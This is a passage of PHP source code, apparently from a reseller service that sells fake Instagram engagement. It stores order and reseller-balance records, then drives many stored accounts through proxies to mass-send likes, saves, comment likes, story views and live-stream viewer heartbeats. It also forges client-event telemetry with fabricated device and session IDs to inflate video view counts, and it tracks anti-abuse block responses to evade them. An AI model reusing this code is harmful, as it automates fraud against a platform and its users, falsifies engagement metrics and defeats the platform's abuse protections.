			$this->db->query('INSERT INTO bayi_islem (bayiID,islemTip,mediaID,likedComment,likedCommentID,userName,krediTotal,krediLeft,talepPrice,isApi) VALUES(:bayiID,:islemTip,:mediaID,:likedComment,:likedCommentID,:userName,:krediTotal,:krediLeft,:talepPrice,:isapi)', ['bayiID' => $this->data['bayiID'], 'islemTip' => $this->data['islemTip'], 'mediaID' => $this->data['media_id'], 'likedComment' => $this->data['likedComment'], 'likedCommentID' => $this->data['likedCommentID'], 'userName' => $this->data['username'], 'krediTotal' => $this->data['krediTotal'], 'krediLeft' => $this->data['krediLeft'], 'talepPrice' => $this->data['tutar'], 'isapi' => 1]);
			$orderID = $this->db->lastInsertId();
		} else if ($this->data['islemTip'] == 'canliyayin') {
			$this->db->query('INSERT INTO bayi_islem (bayiID,islemTip,userID,userName,broadcastID,krediTotal,krediLeft,talepPrice,isApi) VALUES(:bayiID,:islemTip,:userID,:userName,:broadcastID,:krediTotal,:krediLeft,:talepPrice,:isapi)', ['bayiID' => $this->data['bayiID'], 'islemTip' => $this->data['islemTip'], 'userID' => $this->data['userID'], 'userName' => $this->data['userName'], 'broadcastID' => $this->data['broadcastID'], 'krediTotal' => $this->data['krediTotal'], 'krediLeft' => $this->data['krediLeft'], 'talepPrice' => $this->data['tutar'], 'isapi' => 1]);
			$orderID = $this->db->lastInsertId();
		}

		if (!empty($orderID)) {
			$this->db->query('UPDATE bayi SET bakiye = bakiye - :tutar WHERE bayiID=:bayiID', ['bayiID' => $this->data['bayiID'], 'tutar' => $this->data['tutar']]);
		}

		return $orderID;
	}
}

class BulkReaction
{
	protected $users = [];
	protected $simultanepostsize;
	protected $IGDataPath;

	public function __construct($users, $simultanepostsize = 100)
	{
		if (!is_array($users) || empty($users)) {
			throw new Exception('Invalid user array!');
		}

		$this->simultanepostsize = $simultanepostsize;
		$this->IGDataPath = Wow::get('project/cookiePath') . 'instagramv3/';
		$userIndex = 0;

		foreach ($users as $user) {
			$this->users[] = ['data' => array_merge($user, ['index' => $userIndex]), 'object' => new Instagram($user['kullaniciAdi'], $user['sifre'], $user['instaID'])];
			$userIndex++;
		}
	}

	public function DeviceId()
	{
		return 'E' . rand(0, 9) . 'CD' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . '-' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . '-' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . '-' . rand(0, 9) . 'A' . rand(0, 9) . '' . rand(0, 9) . '-C' . rand(0, 9) . 'F' . rand(0, 9) . '' . rand(0, 9) . 'D' . rand(0, 9) . 'F' . rand(0, 9) . 'AEE';
	}

	public function SessionId()
	{
		return 'DC' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . 'C-' . rand(0, 9) . '' . rand(0, 9) . 'A' . rand(0, 9) . '-' . rand(0, 9) . 'F' . rand(0, 9) . '' . rand(0, 9) . '-B' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . '-' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . 'A' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . 'FB' . rand(0, 9) . '';
	}

	public function izlenme($mediaCode)
	{
		$totalSuccessCount = 0;
		$triedUsers = [];
		$postlar = [];
		$rollingCurl = new \RollingCurl\RollingCurl();
		$DeviceId = $this->DeviceId();
		$SessionId = $this->SessionId();

		foreach ($this->users as $user) {
			$headers = ['Connection: keep-alive', 'Proxy-Connection: keep-alive', 'X-IG-Connection-Type: WiFi', 'X-IG-Capabilities: Fw==', 'Accept-Language:fr'];
			$objInstagram = $user['object'];
			$objData = $objInstagram->getData();
			$userAsns = Utils::generateAsns($objData[INSTAWEB_ASNS_KEY]);
			$options = [CURLOPT_USERAGENT => 'Instagram 9.4.0 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; fr_FR)', CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_VERBOSE => false, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_ENCODING => '', CURLOPT_COOKIE => $objData['cookie']];

			if ($userAsns[0]) {
				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				$options[$optionKey] = $userAsns[0];

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					$options[$optionKey] = $userAsns[1];
				}
			}

			$rollingCurl->get('https://www.instagram.com/p/' . $mediaCode . '/?__a=1', $headers, $options, $user['data']);
		}
		$rollingCurl->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$triedUsers, &$totalSuccessCount, &$logData, &$DeviceId, &$SessionId, &$postlar) {
			$triedUser = ['userID' => $request->identifierParams['uyeID'], 'instaID' => $request->identifierParams['instaID'], 'userNick' => $request->identifierParams['kullaniciAdi'], 'status' => 'na'];
			$postveri = ['post' => ''];
			$isErrored = $request->getResponseError();

			if (empty($isErrored)) {
				$responseInfo = $request->getResponseInfo();

				if ($responseInfo['http_code'] == 200) {
					$donenSonuc = json_decode($request->getResponseText(), true);
					if (isset($donenSonuc['graphql']) && ($donenSonuc['graphql']['shortcode_media']['__typename'] == 'GraphVideo')) {
						$totalSuccessCount++;
						$triedUser['status'] = 'success';
						$insta_id = $triedUser['instaID'];
						$tracking_token = $donenSonuc['graphql']['shortcode_media']['tracking_token'];
						$Ts = $donenSonuc['graphql']['shortcode_media']['taken_at_timestamp'];
						$ResimUserId = $donenSonuc['graphql']['shortcode_media']['owner']['id'];
						$ResimUsername = $donenSonuc['graphql']['shortcode_media']['owner']['username'];
						$MediaId = '' . $donenSonuc['graphql']['shortcode_media']['id'] . '_' . $insta_id . '';
						$TimeHack = time() * 86400;
						$CookieId = $insta_id;
						$RusMasajYapanlar = "\n" . '{' . "\n" . '"seq":0,' . "\n" . '"app_id":"567067343352427",' . "\n" . '"app_ver":"9.0.1",' . "\n" . '"build_num":"35440032",' . "\n" . '"device_id":"' . $DeviceId . '",' . "\n" . '"session_id":"' . $SessionId . '",' . "\n" . '"uid":"0","data":[' . "\n" . '{"name":"navigation","time":"' . $TimeHack . '.178","module":"profile","extra":{"click_point":"video_thumbnail","nav_depth":2,"grid_index":"10","media_id":"' . $MediaId . '","dest_module":"video_view","seq":4,"nav_time_taken":2,"user_id":"' . $ResimUserId . '","username":"zaferkabalak","pk":"' . $CookieId . '"}},' . "\n" . '{"name":"navigation","time":"' . $TimeHack . '.178","module":"profile","extra":{"click_point":"video_thumbnail","nav_depth":2,"grid_index":"10","media_id":"' . $MediaId . '","dest_module":"video_view","seq":4,"nav_time_taken":2,"user_id":"' . $ResimUserId . '","username":"zaferkabalak","pk":"' . $CookieId . '"}},' . "\n" . '{"name":"instagram_organic_impression","time":"' . $TimeHack . '.201","module":"video_view","extra":{"m_pk":"' . $MediaId . '","a_pk":"' . $ResimUserId . '","m_ts":' . $TimeHack . ',"m_t":2,"tracking_token":"' . $tracking_token . '","source_of_action":"video_view","follow_status":"following","m_ix":0,"pk":"' . $CookieId . '"}},' . "\n" . '{"name":"video_displayed","time":"' . $TimeHack . '.201","module":"video_view","extra":{"m_pk":"' . $MediaId . '","a_pk":"' . $ResimUserId . '","m_ts":' . $TimeHack . ',"tracking_token":"' . $tracking_token . '","follow_status":"following","m_ix":0,"initial":"1","a_i":"organic","pk":"' . $CookieId . '"}},' . "\n" . '{"name":"video_should_start","time":"' . $TimeHack . '.201","module":"video_view","extra":{"m_pk":"' . $MediaId . '","a_pk":"' . $ResimUserId . '","m_ts":1500707308,"tracking_token":"' . $tracking_token . '","follow_status":"following","reason":"start","a_i":"organic","pk":"' . $CookieId . '"}},' . "\n" . '{"name":"video_download_completed","time":"' . $TimeHack . '.568","extra":{"url":"https://scontent-frt3-2.cdninstagram.com/vp/8f4c306c142f5859dc4a6a14d2126f76/5A1C1BCC/t50.2886-16/20248700_1381451691971906_8775822576162177024_n.mp4","bytes_downloaded":644944,"bytes_full_content":644944,"total_request_time_ms":362,"connection_type":"WIFI","pk":"' . $CookieId . '"}},' . "\n" . '{"name":"video_started_playing","time":"' . $TimeHack . '.641","module":"video_view","extra":{"m_pk":"' . $MediaId . '","a_pk":"' . $ResimUserId . '","m_ts":' . $TimeHack . ',"tracking_token":"' . $tracking_token . '","follow_status":"following","m_ix":0,"playing_audio":"0","reason":"autoplay","start_delay":1439,"cached":false,"system_volume":"0.5","streaming":true,"prefetch_size":512,"a_i":"organic","pk":"' . $CookieId . '"}},' . "\n" . '{"name":"video_paused","time":"' . $TimeHack . '.756","module":"video_view","extra":{"m_pk":"' . $MediaId . '","a_pk":"' . $ResimUserId . '","m_ts":' . $TimeHack . ',"tracking_token":"' . $tracking_token . '","follow_status":"following","m_ix":0,"time":5.7330000400543213,"duration":10.355000019073486,"timeAsPercent":1.6971055088702147,"playing_audio":"0","original_start_reason":"autoplay","reason":"fragment_paused","lsp":0.0,"system_volume":"0.5","loop_count":1.6971055269241333,"a_i":"organic","pk":"' . $CookieId . '"}},' . "\n" . '{"name":"instagram_organic_viewed_impression","time":"' . $TimeHack . '.757","module":"video_view","extra":{"m_pk":"' . $MediaId . '","a_pk":"' . $ResimUserId . '","m_ts":' . $TimeHack . ',"m_t":2,"tracking_token":"' . $tracking_token . '","source_of_action":"video_view","follow_status":"following","m_ix":0,"pk":"' . $CookieId . '"}},' . "\n" . '{"name":"instagram_organic_time_spent","time":"' . $TimeHack . '.757","module":"video_view","extra":{"m_pk":"' . $MediaId . '","a_pk":"' . $ResimUserId . '","m_ts":' . $TimeHack . ',"m_t":2,"tracking_token":"' . $tracking_token . '","source_of_action":"video_view","follow_status":"following","m_ix":0,"timespent":10556,"avgViewPercent":1.0,"maxViewPercent":1.0,"pk":"' . $CookieId . '"}},' . "\n" . '{"name":"app_state","time":"' . $TimeHack . '.764","module":"video_view","extra":{"state":"background","pk":"' . $CookieId . '"}},' . "\n" . '{"name":"time_spent_bit_array","time":"' . $TimeHack . '.764","extra":{"tos_id":"hb58md","start_time":' . $TimeHack . ',"tos_array":"[1, 0]","tos_len":16,"tos_seq":1,"tos_cum":5,"pk":"' . $CookieId . '"}},{"name":"video_started_playing","time":"' . $TimeHack . '.780","module":"video_view_profile","extra":{"video_type":"feed","m_pk":"' . $MediaId . '","a_pk":"' . $ResimUserId . '","m_ts":' . $TimeHack . ',"tracking_token":"' . $tracking_token . '","follow_status":"following","m_ix":0,"playing_audio":"0","reason":"autoplay","start_delay":45,"cached":false,"system_volume":"1.0","streaming":true,"prefetch_size":512,"video_width":0,"video_height":0,"is_dash_eligible":1,"playback_format":"dash","a_i":"organic","pk":"' . $CookieId . '","release_channel":"beta","radio_type":"wifi-none"}}],"log_type":"client_event"}';
						$postveri['post'] = $RusMasajYapanlar;
					}
				} else {
					$triedUser['status'] = 'fail';
				}
			}

			$triedUsers[] = $triedUser;
			$postlar[] = $postveri;
			$rollingCurl->clearCompleted();
			$rollingCurl->prunePendingRequestQueue();
		});
		$rollingCurl->setSimultaneousLimit($this->simultanepostsize);
		$rollingCurl->execute();

		foreach ($postlar as $user) {
			$headers = ['Accept: ', 'X-IG-Connection-Type: WiFi', 'X-IG-Capabilities: 36oD', 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8', 'Accept-Language: fr;q=1', 'Connection: keep-alive', 'User-Agent: Instagram 9.0.1 (iPad2,5; iPhone OS 8_3; fr_FR; fr; scale=' . rand(0, 9) . '.' . rand(0, 9) . '' . rand(0, 9) . '; gamut=normal; ' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . 'x9' . rand(0, 9) . '' . rand(0, 9) . ') AppleWebKit/' . rand(0, 9) . '' . rand(0, 9) . '' . rand(0, 9) . '+'];
			$options = [CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_VERBOSE => false, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_ENCODING => ''];
			$post = 'message=' . $user['post'] . '&format=json';

			if ($userAsns[0]) {
				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				$options[$optionKey] = $userAsns[0];

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					$options[$optionKey] = $userAsns[1];
				}
			}

			$rollingCurl->post('https://graph.instagram.com/logging_client_events', $post, $headers, $options, '');
		}
		$rollingCurl->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$veriler) {
			$rollingCurl->clearCompleted();
			$rollingCurl->prunePendingRequestQueue();
		});
		$rollingCurl->setSimultaneousLimit($this->simultanepostsize);
		$rollingCurl->execute();
		return ['totalSuccessCount' => intval($totalSuccessCount) / 2, 'users' => $triedUsers];
	}

	public function playLive($broadcastID)
	{
		$totalSuccessCount = 0;
		$triedUsers = [];
		$rollingCurl = new \RollingCurl\RollingCurl();

		foreach ($this->users as $user) {
			$objInstagram = $user['object'];
			$objData = $objInstagram->getData();
			$requestPosts = ['_uuid' => $objData['uuid'], '_uid' => $objData['username_id'], '_csrftoken' => $objData['token'], 'radio_type' => 'wifi-none'];
			$requestPosts = Signatures::signData($requestPosts);
			$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
			$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: ' . mt_rand(1000, 3700) . 'kbps', 'X-FB-HTTP-Engine: Liger', 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8', 'Accept-Language: fr-FR'];
			$options = [CURLOPT_USERAGENT => $objData['user_agent'], CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_VERBOSE => false, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_ENCODING => '', CURLOPT_COOKIE => $objData['cookie']];
			$rollingCurl->post('https://i.instagram.com/api/v1/live/' . $broadcastID . '/heartbeat_and_get_viewer_count/', $postData, $headers, $options, $user['data']);
		}

		$rollingCurl->setSimultaneousLimit(500);
		$rollingCurl->execute();
		return ['totalSuccessCount' => $totalSuccessCount, 'users' => $triedUsers];
	}

	public function save($mediaID, $mediaCode)
	{
		$totalSuccessCount = 0;
		$triedUsers = [];
		$rollingCurl = new \RollingCurl\RollingCurl();
		$arrMediaID = explode('_', $mediaID);
		$mediaIDBeforer = $arrMediaID[0];

		foreach ($this->users as $user) {
			$objInstagram = $user['object'];
			$objData = $objInstagram->getData();
			$userAsns = Utils::generateAsns($objData[INSTAWEB_ASNS_KEY]);
			$requestPosts = ['_uuid' => $objData['uuid'], '_uid' => $objData['username_id'], '_csrftoken' => $objData['token'], 'media_id' => $mediaID];
			$requestPosts = Signatures::signData($requestPosts);
			$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
			$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: ' . mt_rand(1000, 3700) . 'kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR'];
			$options = [CURLOPT_USERAGENT => $objData['user_agent'], CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_VERBOSE => false, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_ENCODING => '', CURLOPT_COOKIE => $objData['cookie']];

			if ($userAsns[0]) {
				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				$options[$optionKey] = $userAsns[0];

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					$options[$optionKey] = $userAsns[1];
				}
			}

			$rollingCurl->post('https://i.instagram.com/api/v1/media/' . $mediaID . '/save/', $postData, $headers, $options, $user['data']);
		}
		$rollingCurl->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$triedUsers, &$totalSuccessCount, &$logData) {
			$triedUser = ['userID' => $request->identifierParams['uyeID'], 'instaID' => $request->identifierParams['instaID'], 'userNick' => $request->identifierParams['kullaniciAdi'], 'status' => 'na'];
			$isErrored = $request->getResponseError();

			if (empty($isErrored)) {
				$responseInfo = $request->getResponseInfo();

				if ($responseInfo['http_code'] == 200) {
					$donenSonuc = json_decode($request->getResponseText(), true);

					if ($donenSonuc) {
						if (strpos($request->getResponseHeaders(), 'Set-Cookie') !== false) {
							$obj = $this->users[$request->identifierParams['index']]['object'];
							$obj->organizeCookies($request->getResponseHeaders());
						}

						if ($request->identifierParams['isWebCookie'] == 1) {
							if ($donenSonuc['status'] == 'ok') {
								$totalSuccessCount++;
								$triedUser['status'] = 'success';
							} else {
								$triedUser['status'] = 'fail';
							}
						} else if ($donenSonuc['status'] == 'ok') {
							$totalSuccessCount++;
							$triedUser['status'] = 'success';
						} else {
							$triedUser['status'] = 'fail';
						}
					}

					$triedUser['info'] = $donenSonuc;
					$triedUser['total'] = $totalSuccessCount;
				} else {
					$triedUser['status'] = 'fail';
				}
			}

			$triedUsers[] = $triedUser;
			$rollingCurl->clearCompleted();
			$rollingCurl->prunePendingRequestQueue();
		});
		$rollingCurl->setSimultaneousLimit($this->simultanepostsize);
		$rollingCurl->execute();
		return ['totalSuccessCount' => $totalSuccessCount, 'users' => $triedUsers];
	}

	public function like($mediaID, $mediaUsername, $mediaUserID)
	{
		$totalSuccessCount = 0;
		$triedUsers = [];
		$rollingCurl = new \RollingCurl\RollingCurl();

		foreach ($this->users as $user) {
// 			$objInstagram = $user['object'];
// 			$objData = $objInstagram->getData();
// 			$userAsns = Utils::generateAsns($objData[INSTAWEB_ASNS_KEY]);
            $objInstagram = $user['object'];
			$objData = $objInstagram->getDataFollow();
			$userAsns = Utils::generateAsnsFollow($objData[INSTAWEB_ASNS_KEY_FOLLOW]);
			
			$objInstagram->getLoginTimelineFeed();
			$requestPosts = ['module_name' => 'profile', 'media_id' => $mediaID, '_csrftoken' => $objData['token'], 'username' => $mediaUsername, 'user_id' => $mediaUserID, 'radio_type' => 'wifi-none', '_uid' => $objData['username_id'], '_uuid' => $objData['uuid'], 'd' => 0];
			$requestPosts = Signatures::signData($requestPosts, ['d']);
			$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
			$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: ' . mt_rand(1000, 3700) . 'kbps', 'X-IG-Bandwidth-Speed-KBPS: 514.297', 'X-IG-Bandwidth-TotalBytes-B: 15502891', 'X-IG-Bandwidth-TotalTime-MS: 25064', 'X-IG-ABR-Connection-Speed-KBPS: 162', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR'];
			$options = [CURLOPT_USERAGENT => $objData['user_agent'], CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_VERBOSE => false, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_ENCODING => '', CURLOPT_COOKIE => $objData['cookie']];

			if ($userAsns[0]) {

				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				$options[$optionKey] = $userAsns[0];

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					$options[$optionKey] = $userAsns[1];
				}
			}

			$rollingCurl->post('https://i.instagram.com/api/v1/media/' . $mediaID . '/like/', $postData, $headers, $options, $user['data']);
		}
		$rollingCurl->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$triedUsers, &$totalSuccessCount, &$logData, &$userAsns) {
			$triedUser = ['userID' => $request->identifierParams['uyeID'], 'instaID' => $request->identifierParams['instaID'], 'userNick' => $request->identifierParams['kullaniciAdi'], 'status' => 'na'];
			$isErrored = $request->getResponseError();
			if (empty($isErrored) && stristr($request->getUrl(), '/like/')) {
				$responseInfo = $request->getResponseInfo();

				if ($responseInfo['http_code'] == 200) {
					$donenSonuc = json_decode($request->getResponseText(), true);

					if ($donenSonuc) {
						if (strpos($request->getResponseHeaders(), 'Set-Cookie') !== false) {
							$obj = $this->users[$request->identifierParams['index']]['object'];
							$obj->organizeCookies($request->getResponseHeaders());
						}

						if ($donenSonuc['status'] == 'ok') {
							$totalSuccessCount++;
							$triedUser['status'] = 'success';
						} else {
							$triedUser['status'] = 'fail';
						}
					}

					$triedUser['info'] = $donenSonuc;
				} else {
					$triedUser['status'] = 'fail';
					$triedUser['info'] = $responseInfo;
					$kontrol = json_decode($request->getResponseText(), true);
					$triedUser['text'] = $kontrol;
					if (($kontrol['message'] == 'login_required') || ($kontrol['message'] == 'challenge_required')) {
						$triedUser['durum'] = 0;
					}
					$triedUser['message'] = $kontrol['feedback_message'];
					$triedUser['spam'] = $kontrol['spam'];

					if (($kontrol['feedback_message'] == 'Nous limitons certaines activités pour protéger votre communauté.' && $kontrol['feedback_url'] == 'repute/report_problem/instagram_like_add/?violation_type&responsible_policy=Ig.Policy.Engagement.SessionClassifier.SessionClassifierBlockAccess')) {
						$triedUser['status'] = 'flag';
						$triedUser['ip'] = $userAsns[0];
					}

					if (($kontrol['feedback_message'] == 'Nous limitons certaines activités pour protger votre communauté.' && $kontrol['feedback_url'] == 'repute/report_problem/instagram_like_add/?violation_type&responsible_policy=Ig.Policy.Engagement.TallyCluster.SourceUserAppGap10V1D70')) {
						$triedUser['status'] = 'flag';
						$triedUser['ip'] = $userAsns[0];
					}
				}
			}

			$triedUsers[] = $triedUser;
			$rollingCurl->clearCompleted();
			$rollingCurl->prunePendingRequestQueue();
		});

		$rollingCurl->setSimultaneousLimit($this->simultanepostsize);
		$rollingCurl->execute();
		return ['totalSuccessCount' => $totalSuccessCount, 'users' => $triedUsers];
	}

	public function commentlike($mediaID, $commentID)
	{
		$totalSuccessCount = 0;
		$triedUsers = [];
		$rollingCurl = new \RollingCurl\RollingCurl();
		$arrMediaID = explode('_', $mediaID);
		$mediaIDBeforer = $arrMediaID[0];

		foreach ($this->users as $user) {
			$objInstagram = $user['object'];
			$objData = $objInstagram->getData();
			$userAsns = Utils::generateAsns($objData[INSTAWEB_ASNS_KEY]);
			$requestPosts = ['_uuid' => $objData['uuid'], '_uid' => $objData['username_id'], '_csrftoken' => $objData['token'], 'media_id' => $mediaIDBeforer];
			$requestPosts = Signatures::signData($requestPosts);
			$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
			$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: ' . mt_rand(1000, 3700) . 'kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-IG-ABR-Connection-Speed-KBPS: 162', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR'];
			$options = [CURLOPT_USERAGENT => $objData['user_agent'], CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_VERBOSE => false, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_ENCODING => '', CURLOPT_COOKIE => $objData['cookie']];

			if ($userAsns[0]) {
				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				$options[$optionKey] = $userAsns[0];

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					$options[$optionKey] = $userAsns[1];
				}
			}

			$rollingCurl->post('https://i.instagram.com/api/v1/media/' . $commentID . '/comment_like/', $postData, $headers, $options, $user['data']);
		}
		$rollingCurl->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$triedUsers, &$totalSuccessCount, &$logData) {
			$triedUser = ['userID' => $request->identifierParams['uyeID'], 'instaID' => $request->identifierParams['instaID'], 'userNick' => $request->identifierParams['kullaniciAdi'], 'status' => 'na'];
			$isErrored = $request->getResponseError();

			if (empty($isErrored)) {
				$responseInfo = $request->getResponseInfo();

				if ($responseInfo['http_code'] == 200) {
					$donenSonuc = json_decode($request->getResponseText(), true);

					if ($donenSonuc) {
						if (strpos($request->getResponseHeaders(), 'Set-Cookie') !== false) {
							$obj = $this->users[$request->identifierParams['index']]['object'];
							$obj->organizeCookies($request->getResponseHeaders());
						}

						if ($donenSonuc['status'] == 'ok') {
							$totalSuccessCount++;
							$triedUser['status'] = 'success';
						} else {
							$triedUser['status'] = 'fail';
							$triedUser['info'] = $donenSonuc;
						}
					}
				} else {
					$triedUser['status'] = 'fail';
					$triedUser['info'] = $responseInfo;
				}
			}

			$triedUsers[] = $triedUser;
			$rollingCurl->clearCompleted();
			$rollingCurl->prunePendingRequestQueue();
		});
		$rollingCurl->setSimultaneousLimit($this->simultanepostsize);
		$rollingCurl->execute();
		return ['totalSuccessCount' => $totalSuccessCount, 'users' => $triedUsers];
	}

	public function storyview($items, $sourceId = NULL)
	{
		$reels = [];
		$maxSeenAt = time();
		$seenAt = $maxSeenAt - (3 * count($items));

		foreach ($items as $item) {
			$itemTakenAt = $item['getTakenAt'];

			if ($seenAt < $itemTakenAt) {
				$seenAt = $itemTakenAt + 2;
			}

			if ($maxSeenAt < $seenAt) {
				$seenAt = $maxSeenAt;
			}

			$reelId = $item['itemID'] . '_' . $item['userPK'];
			$reels[$reelId] = [$itemTakenAt . '_' . $seenAt];
			$seenAt += rand(1, 3);
		}

		$totalSuccessCount = 0;
		$triedUsers = [];
		$rollingCurl = new \RollingCurl\RollingCurl();

		foreach ($this->users as $user) {
			$objInstagram = $user['object'];
			$objData = $objInstagram->getData();
			$userAsns = Utils::generateAsns($objData[INSTAWEB_ASNS_KEY]);
			$requestPosts = [
				'_uuid'      => $objData['uuid'],
				'_uid'       => $objData['username_id'],
				'_csrftoken' => $objData['token'],
				'reels'      => $reels,
				'live_vods'  => [],
				'reel'       => 1,
				'live_vod'   => 0
			];
			$requestPosts = Signatures::signData($requestPosts);
			$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
			$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: ' . mt_rand(1000, 3700) . 'kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR'];
			$options = [CURLOPT_USERAGENT => $objData['user_agent'], CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_VERBOSE => false, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_ENCODING => '', CURLOPT_COOKIE => $objData['cookie']];

			if ($userAsns[0]) {
				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				$options[$optionKey] = $userAsns[0];

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					$options[$optionKey] = $userAsns[1];
				}
			}

			$rollingCurl->post('https://i.instagram.com/api/v2/media/seen/', $postData, $headers, $options, $user['data']);
		}
		$rollingCurl->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$triedUsers, &$totalSuccessCount, &$logData) {
			$triedUser = ['userID' => $request->identifierParams['uyeID'], 'instaID' => $request->identifierParams['instaID'], 'userNick' => $request->identifierParams['kullaniciAdi'], 'status' => 'na'];
			$isErrored = $request->getResponseError();

			if (empty($isErrored)) {
				$responseInfo = $request->getResponseInfo();

				if ($responseInfo['http_code'] == 200) {
					$donenSonuc = json_decode($request->getResponseText(), true);

					if ($donenSonuc) {
						if (strpos($request->getResponseHeaders(), 'Set-Cookie') !== false) {
							$obj = $this->users[$request->identifierParams['index']]['object'];
							$obj->organizeCookies($request->getResponseHeaders());
						}

						if ($request->identifierParams['isWebCookie'] == 1) {
							if ($donenSonuc['status'] == 'ok') {
								$totalSuccessCount++;
								$triedUser['status'] = 'success';
							} else {
								$triedUser['status'] = 'fail';
							}
						} else if ($donenSonuc['status'] == 'ok') {
							$totalSuccessCount++;
							$triedUser['status'] = 'success';
						} else {
							$triedUser['status'] = 'fail';
						}
					}
				} else {
					$triedUser['status'] = 'fail';
				}
			}

			$triedUsers[] = $triedUser;
